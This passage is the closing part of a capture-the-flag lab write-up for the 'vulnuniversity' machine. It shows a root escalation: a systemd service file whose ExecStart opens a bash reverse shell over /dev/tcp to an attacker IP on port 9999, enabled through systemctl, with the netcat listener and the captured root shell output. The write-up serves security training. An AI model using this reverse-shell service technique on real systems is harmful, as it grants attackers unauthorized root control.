+&lt;v/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'WantedBy=multi-user.target'</span> <span class="o">&gt;&gt;</span> root.service                    
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>root.service
+<span class="nb">cat </span>root.service
+<span class="o">[</span>Unit]
+<span class="nv">Description</span><span class="o">=</span>roooooooooot
+
+<span class="o">[</span>Service]
+<span class="nv">Type</span><span class="o">=</span>simple
+<span class="nv">User</span><span class="o">=</span>root
+<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.4.119.29/9999 0&gt;&amp;1'</span>
+
+<span class="o">[</span>Install]
+<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</code></pre></div></div> <p><br> Start a listener that listens on port 9999.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 9999                                       
+listening on <span class="o">[</span>any] 9999 ...
+</code></pre></div></div> <p><br> Use systemctl to enable and start the new root.service.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@vulnuniversity:/dev/shm<span class="nv">$ </span>/bin/systemctl <span class="nb">enable</span> /dev/shm/root.service
+/bin/systemctl <span class="nb">enable</span> /dev/shm/root.service
+Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service.
+Created symlink from /etc/systemd/system/root.service to /dev/shm/root.service.
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span>/bin/systemctl start root  
+/bin/systemctl start root
+</code></pre></div></div> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 9999                                       
+listening on <span class="o">[</span>any] 9999 ...
+connect to <span class="o">[</span>10.4.119.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.207.42] 42488
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>2059<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@vulnuniversity:/#
+</code></pre></div></div> <p><br> Get the root.txt flag.txt. Run ifconfig to complete the trophy.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@vulnuniversity:/# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+root@vulnuniversity:/# ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:ab:3b:49:61:43  
+          inet addr:10.10.207.42  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::ab:3bff:fe49:6143/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:9430 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:8731 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:921735 <span class="o">(</span>921.7 KB<span class="o">)</span>  TX bytes:8779920 <span class="o">(</span>8.7 MB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:751 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:751 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:69416 <span class="o">(</span>69.4 KB<span class="o">)</span>  TX bytes:69416 <span class="o">(</span>69.4 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Hope you enjoyed the box. Feel free to check out one of my other write-ups.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
